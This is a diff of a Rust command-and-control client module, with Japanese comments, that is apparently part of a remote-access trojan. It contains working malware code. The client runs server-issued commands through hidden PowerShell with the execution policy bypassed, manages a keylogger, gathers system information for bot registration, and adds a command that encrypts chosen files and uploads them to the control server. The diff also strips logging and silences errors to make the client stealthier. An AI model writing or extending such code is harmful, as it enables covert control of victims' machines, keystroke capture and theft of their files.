@@ -1,11 +1,10 @@
 // C2 (Command and Control) クライアントモジュール
+use crate::{
+    collectors::system_info::{get_system_info_async, generate_hardware_id}, core::config::Config, IntegratedPayload,
+};
 use serde::{Deserialize, Serialize};
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
 use tokio::time;
-use crate::collectors::system_info::get_system_info_async;
-
-use crate::core::config::Config;
-use crate::IntegratedPayload;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum ClientCommandType {
@@ -21,14 +20,16 @@ enum ClientCommandType {
     KeylogDownload,
     UpdateSystemInfo,
     WebhookSend,
+    UploadEncrypted,
 }
 
 impl ClientCommandType {
     fn from_str(s: &str) -> Option<Self> {
         match s.to_lowercase().as_str() {
             // main execution
-            "execute" | "exec" | "cmd" | "command" | "run" | "execute_debug_command" =>
-                Some(Self::Execute),
+            "execute" | "exec" | "cmd" | "command" | "run" | "execute_debug_command" => {
+                Some(Self::Execute)
+            }
             // file ops
             "list_files" | "ls" | "dir" => Some(Self::ListFiles),
             "get_file_info" | "fileinfo" | "stat" => Some(Self::GetFileInfo),
@@ -44,12 +45,12 @@ impl ClientCommandType {
             "update_system_info" | "sysinfo" | "update_sysinfo" => Some(Self::UpdateSystemInfo),
             // webhook
             "webhook_send" | "webhook" | "send_webhook" => Some(Self::WebhookSend),
+            // encrypted file upload
+            "upload_encrypted" | "upload_enc" | "secure_upload" => Some(Self::UploadEncrypted),
             _ => None,
         }
     }
 }
-
-
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct ServerCommand {
@@ -88,17 +89,14 @@ pub struct C2Client {
     keylogger_active: bool,
     keylogger_duration: Option<u32>, // キーロガーの実行時間（ms）
     initial_registration_done: bool, // 初回登録済みフラグ
+    executed_commands: std::collections::HashSet<String>, // 実行済みコマンドID
 }
 
 impl C2Client {
     pub fn new(config: Config) -> Self {
-        let client_id = format!(
-            "aoi64_{}",
-            SystemTime::now()
-                .duration_since(UNIX_EPOCH)
-                .unwrap_or_default()
-                .as_secs()
-        );
+        // ハードウェアIDを生成して同じハードウェアからは同じIDにする
+        let client_id = generate_hardware_id();
+        
         // 設定は引数の値（またはデフォルト）をそのまま使用
         Self {
             config,
@@ -107,6 +105,7 @@ impl C2Client {
             keylogger_active: false,
             keylogger_duration: None,
             initial_registration_done: false,
+            executed_commands: std::collections::HashSet::new(),
         }
     }
 
@@ -116,29 +115,8 @@ impl C2Client {
 
         self.is_active = true;
 
-        // 初回ハートビート送信
-        println!(
-            "📡 Sending initial heartbeat to {}...",
-            self.config.command_server_url
-        );
-        match self.send_heartbeat("online").await {
-            Ok(()) => {
-                println!("✅ C2 server connected successfully");
-                println!(
-                    "💓 Heartbeat established with {}",
-                    self.config.command_server_url
-                );
-            }
-            Err(e) => {
-                println!("⚠️  Initial heartbeat failed: {}", e);
-                println!("🔄 Continuing in offline mode, will retry periodically");
-            }
-        }
-
-        println!(
-            "🔄 Entering C2 standby (heartbeat {}s, poll {}s)...",
-            self.config.heartbeat_interval_seconds, self.config.command_poll_interval_seconds
-        );
+        // 初回ハートビート送信（ログ最小化）
+        let _ = self.send_heartbeat("online").await;
 
         let mut hb_interval = time::interval(Duration::from_secs(
             self.config.heartbeat_interval_seconds.max(1),
@@ -163,20 +141,14 @@ impl C2Client {
         }
 
         self.is_active = false;
-        println!("📡 Sending offline heartbeat...");
         let _ = self.send_heartbeat("offline").await;
-        println!("🌐 C2 Client shutdown complete");
         Ok(())
     }
 
     /// 1回のC2サイクルを処理
     async fn process_c2_cycle(&mut self) {
         // サーバーコマンドのチェックと実行
-        if let Ok(command_count) = self.check_and_execute_commands().await {
-            if command_count > 0 {
-                println!("⚡ Executed {} command(s)", command_count);
-            }
-        }
+        let _ = self.check_and_execute_commands().await;
     }
 
     /// サーバーからコマンドをチェックして実行（DRY化・効率化）
@@ -190,13 +162,11 @@ impl C2Client {
         for command in commands {
             match self.execute_command(command).await {
                 Ok(response) => {
-                    if let Err(e) = self.send_command_response(&response).await {
-                        eprintln!("🌐 Failed to send command response: {}", e);
-                    }
+                    let _ = self.send_command_response(&response).await;
                     executed_count += 1;
                 }
-                Err(e) => {
-                    eprintln!("🌐 Command execution failed: {}", e);
+                Err(_) => {
+                    // エラーは静黙でスキップ
                 }
             }
         }
@@ -243,10 +213,27 @@ impl C2Client {
             ));
         }
 
-        println!(
-            "📨 Received command: {} (ID: {})",
-            command.command_type, command.id
-        );
+        // 重複実行チェック
+        if self.executed_commands.contains(&command.id) {
+            return Err(format!("Command already executed: {}", command.id));
+        }
+
+        // コマンドIDを実行済みリストに追加
+        self.executed_commands.insert(command.id.clone());
+        
+        // 実行済みコマンドリストのサイズ制限（最大100個）
+        if self.executed_commands.len() > 100 {
+            // 古いコマンドIDを削除（HashSetなので順序はないが、メモリ使用量を制限）
+            let ids_to_remove: Vec<String> = self.executed_commands.iter()
+                .take(self.executed_commands.len() - 90)
+                .cloned()
+                .collect();
+            for id in ids_to_remove {
+                self.executed_commands.remove(&id);
+            }
+        }
+
+        // コマンド受信（ログ最小化）
 
         let result = match ClientCommandType::from_str(&command.command_type) {
             Some(ClientCommandType::Execute) => {
@@ -273,13 +260,18 @@ impl C2Client {
             Some(ClientCommandType::KeylogStop) => self.handle_keylog_stop_command().await,
             Some(ClientCommandType::KeylogStatus) => self.handle_keylog_status_command().await,
             Some(ClientCommandType::KeylogDownload) => {
-                self.handle_keylog_download_command(&command.parameters).await
+                self.handle_keylog_download_command(&command.parameters)
+                    .await
             }
             Some(ClientCommandType::UpdateSystemInfo) => {
                 self.handle_update_system_info_command().await
             }
             Some(ClientCommandType::WebhookSend) => {
                 self.handle_webhook_send_command(&command.parameters).await
+            }
+            Some(ClientCommandType::UploadEncrypted) => {
+                self.handle_upload_encrypted_command(&command.parameters)
+                    .await
             }
             None => Err(format!("Unknown command type: {}", command.command_type)),
         };
@@ -321,13 +313,7 @@ impl C2Client {
     ) -> Result<(), Box<dyn std::error::Error>> {
         let url = format!("{}/api/commands/response", self.config.command_server_url);
 
-        println!("📤 Sending command response to: {}", url);
-        println!("   Command ID: {}", response.command_id);
-        println!("   Success: {}", response.success);
-        println!("   Message: {}", response.message);
-
         let json_body = serde_json::to_string(response)?;
-        println!("   Payload size: {} bytes", json_body.len());
 
         let http_response = self
             .with_defaults(
@@ -338,10 +324,6 @@ impl C2Client {
             .send()?;
 
         if http_response.status_code >= 200 && http_response.status_code < 300 {
-            println!(
-                "✅ Command response sent successfully (HTTP {})",
-                http_response.status_code
-            );
             Ok(())
         } else {
             let error_msg = format!(
@@ -349,7 +331,6 @@ impl C2Client {
                 http_response.status_code,
                 http_response.as_str().unwrap_or("no body")
             );
-            println!("❌ {}", error_msg);
             Err(error_msg.into())
         }
     }
@@ -358,23 +339,17 @@ impl C2Client {
     async fn send_heartbeat(&mut self, status: &str) -> Result<(), Box<dyn std::error::Error>> {
         let url = format!("{}/api/heartbeat", self.config.command_server_url);
 
-        // システム情報は初回登録時のみ送信
+        // システム情報は初回登録時のみ送信（ログ最小化）
         let system_info = if !self.initial_registration_done {
-            println!("📊 Collecting system info for initial registration...");
             match get_system_info_async().await {
                 Ok(info) => {
                     self.initial_registration_done = true;
                     let system_info_json = serde_json::to_value(info)?;
-                    println!("✅ System info collected and will be sent");
                     Some(system_info_json)
-                },
-                Err(e) => {
-                    println!("❌ Failed to collect system info: {}", e);
-                    None
-                },
+                }
+                Err(_) => None
             }
         } else {
-            println!("⚪ Skipping system info (already registered)");
             None
         };
 
@@ -432,6 +407,145 @@ impl C2Client {
         } else {
             Err(format!("Data upload failed: HTTP {}", response.status_code).into())
         }
+    }
+
+    /// 暗号化データをサーバーにアップロード（RSA + ChaCha20-Poly1305ハイブリッド暗号化）
+    pub async fn upload_encrypted_data(
+        &self,
+        encrypted_data: &[u8],
+        wrapped_key: &[u8],
+        data_type: &str,
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        self.upload_encrypted_data_with_filename(encrypted_data, wrapped_key, data_type, None).await
+    }
+
+    /// ファイル名付きで暗号化データをサーバーにアップロード
+    pub async fn upload_encrypted_data_with_filename(
+        &self,
+        encrypted_data: &[u8],
+        wrapped_key: &[u8],
+        data_type: &str,
+        filename: Option<&str>,
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        use base64::{engine::general_purpose, Engine as _};
+        
+        let url = format!("{}/api/encrypted-data/upload", self.config.command_server_url);
+        
+        // Base64エンコード
+        let encrypted_data_b64 = general_purpose::STANDARD.encode(encrypted_data);
+        let wrapped_key_b64 = general_purpose::STANDARD.encode(wrapped_key);
+        
+        let mut body = serde_json::json!({
+            "client_id": self.client_id,
+            "data_type": data_type,
+            "encrypted_data": encrypted_data_b64,
+            "wrapped_key": wrapped_key_b64,
+            "encryption_method": "ChaCha20Poly1305",
+            "key_wrapping_method": "RSA-OAEP-SHA256",
+            "timestamp": SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_secs(),
+        });
+
+        // ファイル名が指定されている場合は追加
+        if let Some(fname) = filename {
+            body["filename"] = serde_json::Value::String(fname.to_string());
+        }
+
+        // 暗号化データアップロード（ログ最小化）
+
+        let response = self
+            .with_defaults(
+                minreq::post(&url)
+                    .with_header("Content-Type", "application/json")
+                    .with_body(serde_json::to_string(&body)?),
+            )
+            .send()?;
+
+        if response.status_code >= 200 && response.status_code < 300 {
+            Ok(())
+        } else {
+            let error_msg = format!(
+                "Encrypted data upload failed: HTTP {} - {}",
+                response.status_code,
+                response.as_str().unwrap_or("no response body")
+            );
+            Err(error_msg.into())
+        }
+    }
+
+    /// セキュアファイルアップロード - ChaCha20Poly1305で暗号化してTLS経由で送信
+    pub async fn upload_encrypted_file<P: AsRef<std::path::Path>>(
+        &self,
+        file_path: P,
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        use crate::utils::crypto::encrypt_file;
+
+        let file_path = file_path.as_ref();
+
+        // ファイルを暗号化
+        let encrypted_file = encrypt_file(file_path)?;
+
+        println!(
+            "✅ File encrypted: {} -> {} bytes",
+            encrypted_file.original_size, encrypted_file.encrypted_size
+        );
+        println!("🔑 Generated encryption key and nonce");
+
+        // サーバーに暗号化ファイルを送信
+        let url = format!("{}/api/files/encrypted", self.config.command_server_url);
+
+        let body = serde_json::json!({
+            "client_id": self.client_id,
+            "encrypted_file": encrypted_file,
+            "timestamp": std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_secs(),
+        });
+
+        println!("📤 Sending encrypted file to server via TLS...");
+        let response = self
+            .with_defaults(
+                minreq::post(&url)
+                    .with_header("Content-Type", "application/json")
+                    .with_body(serde_json::to_string(&body)?),
+            )
+            .send()?;
+
+        if response.status_code >= 200 && response.status_code < 300 {
+            println!("✅ Encrypted file uploaded successfully");
+            if let Ok(response_body) = response.as_str() {
+                if let Ok(json_response) = serde_json::from_str::<serde_json::Value>(response_body)
+                {
+                    if let Some(file_id) = json_response.get("file_id").and_then(|v| v.as_str()) {
+                        println!("📁 Server file ID: {}", file_id);
+                    }
+                }
+            }
+            Ok(())
+        } else {
+            let error_msg = format!(
+                "Encrypted file upload failed: HTTP {} - {}",
+                response.status_code,
+                response.as_str().unwrap_or("no response body")
+            );
+            println!("❌ {}", error_msg);
+            Err(error_msg.into())
+        }
+    }
+
+    /// data.datファイルの暗号化アップロード（互換性関数）
+    pub async fn upload_data_dat_encrypted(&self) -> Result<(), Box<dyn std::error::Error>> {
+        let data_path = std::path::Path::new("data.dat");
+
+        if !data_path.exists() {
+            return Err("data.dat file not found".into());
+        }
+
+        println!("🎯 Uploading data.dat with ChaCha20Poly1305 encryption...");
+        self.upload_encrypted_file(data_path).await
     }
 
     // ========== メインコマンドハンドラー ==========
@@ -681,15 +795,10 @@ impl C2Client {
 
         let timeout = timeout_str.parse::<u64>().unwrap_or(30);
 
-
-
         // 通常のコマンド実行
-        self.execute_powershell_command(command, timeout, working_dir).await
+        self.execute_powershell_command(command, timeout, working_dir)
+            .await
     }
-
-
-
-
 
     /// PowerShellコマンド実行
     async fn execute_powershell_command(
@@ -699,31 +808,35 @@ impl C2Client {
         working_dir: &str,
     ) -> Result<(String, Option<serde_json::Value>), String> {
         println!("🚀 Executing PowerShell command: {}", command);
-        
+
         let start_time = std::time::Instant::now();
-        
+
         let mut cmd = std::process::Command::new("powershell");
-        
+
         cmd.args(&[
-            "-WindowStyle", "Hidden",
-            "-ExecutionPolicy", "Bypass", 
+            "-WindowStyle",
+            "Hidden",
+            "-ExecutionPolicy",
+            "Bypass",
             "-NoProfile",
             "-NonInteractive",
-            "-Command", 
-            command
+            "-Command",
+            command,
         ]);
-        
+
         if !working_dir.is_empty() {
             cmd.current_dir(working_dir);
         }
-        
+
         cmd.stdout(std::process::Stdio::piped());
         cmd.stderr(std::process::Stdio::piped());
-        
+
         let output = match tokio::time::timeout(
             Duration::from_secs(timeout),
             tokio::task::spawn_blocking(move || cmd.output()),
-        ).await {
+        )
+        .await
+        {
             Ok(Ok(Ok(output))) => output,
             Ok(Ok(Err(e))) => {
                 return Err(format!("Command execution failed: {}", e));
@@ -735,12 +848,12 @@ impl C2Client {
                 return Err(format!("Command timed out after {} seconds", timeout));
             }
         };
-        
+
         let execution_time = start_time.elapsed().as_millis() as u64;
         let stdout = String::from_utf8_lossy(&output.stdout);
         let stderr = String::from_utf8_lossy(&output.stderr);
         let exit_code = output.status.code().unwrap_or(-1);
-        
+
         let result_data = serde_json::json!({
             "command": command,
             "working_dir": working_dir,
@@ -751,7 +864,7 @@ impl C2Client {
             "execution_time_ms": execution_time,
             "success": output.status.success()
         });
-        
+
         if output.status.success() {
             println!("✅ Command executed successfully ({}ms)", execution_time);
             Ok((
@@ -764,7 +877,10 @@ impl C2Client {
                 println!("   Error: {}", stderr.trim());
             }
             Ok((
-                format!("Command failed with exit code {} ({}ms)", exit_code, execution_time),
+                format!(
+                    "Command failed with exit code {} ({}ms)",
+                    exit_code, execution_time
+                ),
                 Some(result_data),
             ))
         }
@@ -923,7 +1039,7 @@ impl C2Client {
             Ok(system_info) => {
                 let system_info_json = serde_json::to_value(&system_info)
                     .map_err(|e| format!("Failed to serialize system info: {}", e))?;
-                
+
                 Ok((
                     "System information updated successfully".to_string(),
                     Some(system_info_json),
@@ -949,16 +1065,12 @@ impl C2Client {
         // perform_initial_data_collection と同じ統合ペイロードを作成
         #[cfg(windows)]
         {
-            let mut payload = crate::IntegratedPayload::create_with_config(&self.config)
+            let payload = crate::IntegratedPayload::create_with_config(&self.config)
                 .await
                 .map_err(|e| format!("Failed to build payload: {}", e))?;
 
-            // main.rs と同様にキー/ノンスを生成してペイロードに反映
-            let mut key = [0u8; 32];
-            let mut nonce = [0u8; 12];
-            getrandom::fill(&mut key).expect("Failed to generate random key");
-            getrandom::fill(&mut nonce).expect("Failed to generate random nonce");
-            payload.update_encryption_info(&key, &nonce);
+            // セキュリティ強化: Webhook送信時は暗号化キーをペイロードに含めない
+            // 実際の暗号化は必要時に個別に実行される
 
             // 統一WebHook送信（lib.rs と同一実装）
             crate::send_unified_webhook(&payload, &self.config)
@@ -990,6 +1102,51 @@ impl C2Client {
         #[cfg(not(windows))]
         {
             Err("Webhook with integrated payload is supported only on Windows".to_string())
+        }
+    }
+
+    /// 暗号化ファイルアップロードコマンドの処理
+    async fn handle_upload_encrypted_command(
+        &self,
+        parameters: &[String],
+    ) -> Result<(String, Option<serde_json::Value>), String> {
+        let file_path = parameters
+            .get(0)
+            .ok_or("File path parameter required for encrypted upload")?;
+
+        // ファイルの存在確認
+        if !std::path::Path::new(file_path).exists() {
+            return Err(format!("File not found: {}", file_path));
+        }
+
+        // ファイルサイズ制限チェック（100MB）
+        if let Ok(metadata) = std::fs::metadata(file_path) {
+            const MAX_FILE_SIZE: u64 = 100 * 1024 * 1024; // 100MB
+            if metadata.len() > MAX_FILE_SIZE {
+                return Err(format!(
+                    "File too large: {} bytes (max: {} bytes)",
+                    metadata.len(),
+                    MAX_FILE_SIZE
+                ));
+            }
+        }
+
+        // 暗号化アップロードを実行
+        match self.upload_encrypted_file(file_path).await {
+            Ok(()) => {
+                let result_data = serde_json::json!({
+                    "file_path": file_path,
+                    "encryption": "ChaCha20Poly1305",
+                    "transport": "TLS",
+                    "status": "success"
+                });
+
+                Ok((
+                    format!("File '{}' uploaded with encryption", file_path),
+                    Some(result_data),
+                ))
+            }
+            Err(e) => Err(format!("Encrypted upload failed: {}", e)),
         }
     }
 }
